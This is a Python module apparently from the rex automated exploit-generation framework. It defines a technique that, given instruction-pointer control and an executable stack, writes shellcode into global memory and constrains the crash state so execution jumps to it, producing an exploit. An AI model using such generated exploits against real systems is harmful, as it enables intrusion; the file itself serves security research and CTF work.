import logging
from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.defcc_callshellcode")

class DefccCallShellcode(Technique):

    name = "defcc_callshellcode"

    applicable_to = ['unix']

    def apply(self, **kwargs):

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)


        if not self.crash.project.loader.main_object.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        shellcode = self.shellcode.get_shellcode('defcc_shell_1') #we try shell_1 first
        shc_addr, shc_constraint = self._write_global_data(shellcode)
        # we don't try to use read_rop to drop shellcode into memory
        '''
        if shc_addr is None:
            try:
                shc_addr, shc_constraint = self._read_in_global_data(shellcode)
            except CannotExploit as e:
                raise CannotExploit("[%s] cannot call read, %s" % (self.name, e.message))
            if shc_addr is None:
                raise CannotExploit("[%s] cannot write in shellcode" % self.name)
        '''
        if shc_addr is None:
            #we try shell_2 if shell_1 failed
            shellcode = self.shellcode.get_shellcode('defcc_shell_2') 
            shc_addr, shc_constraint = self._write_global_data(shellcode)  
            if shc_addr is None:
                raise CannotExploit("[%s] cannot write in shellcode" % self.name)
                   
        # apply the constraint that shellcode must exist in memory
        self.crash.state.add_constraints(shc_constraint)

        # add the constraint that the ip must point at the shellcode
        self.crash.state.add_constraints(self.crash.state.ip == shc_addr)

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)

        return Exploit(self.crash, bypasses_nx=False, bypasses_aslr=True)
